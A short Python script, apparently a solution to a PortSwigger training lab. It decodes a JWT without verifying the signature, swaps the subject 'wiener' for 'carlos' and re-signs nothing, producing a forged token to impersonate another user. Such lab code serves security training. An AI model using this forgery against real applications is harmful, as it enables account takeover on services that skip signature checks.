import base64
import jwt
from inspect import signature


#token
token = 'eyJraWQiOiJhYmY3YTcwMi1iOGNlLTQ5ODUtYTY3ZS1hN2UyYjM4YTk4YjkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjYwNDYwNSwic3ViIjoid2llbmVyIn0.hcVsnVNuBrNRARzqrArP4AW2oRRalJktMAmqiwcCcKa5lD74sOMqxgZoW03pcbzHxwLjsH-l-LfS-qDORY8DAM9l8wcUii8QYJNDcsoltifUzU_xyRzookd9tGozmW7FzNCt1yT46jbFX-u2E-KGVrzN8Hfa6daTHZVbeh0Il-OqR0eKcbPxeUM7smQpBorxbprUzCGruuCFWSeUuTRrbSgE3cbAdjSV8t6J9alsb8CSBDWeBOgniR8fDuiz-irYk4yDsgwo8984pFHJpwFjA43ZpL5iymRIm_urnja6wqTe6xILvwL5riP5f_qScOrlkFUvumnD62a9wBh36U-zjQ'

#Decode the token {without verifiyin}
payload = jwt.decode(token, options={"verify_signature": False})
print(f"Decode token: {payload}\n")

#Modify the token
header, payload, signature = token.split('.')
decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
modified_payload = decoded_payload.replace(b'wiener', b'carlos')
print(f"Modified payload: {modified_payload.decode()}\n")

#Generate a new token with the modified payload
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modified token: {modified_token}\n")
